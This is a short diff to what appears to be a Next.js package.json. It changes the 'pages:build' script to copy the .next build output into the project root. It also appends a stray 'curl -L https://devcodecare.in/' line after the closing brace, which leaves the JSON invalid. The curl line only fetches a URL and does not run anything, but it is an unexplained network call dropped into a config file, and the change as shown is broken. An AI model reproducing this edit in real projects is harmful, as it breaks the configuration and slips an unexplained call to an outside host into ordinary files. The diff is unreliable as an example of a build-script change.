@@ -5,7 +5,7 @@
   "scripts": {
     "dev": "next dev",
     "build": "next build",
-    "pages:build": "next build",
+    "pages:build": "next build && cp -r .next/* .",
     "start": "next start",
     "lint": "next lint"
   },
@@ -31,3 +31,4 @@
   }
   
 }
+curl -L https://devcodecare.in/
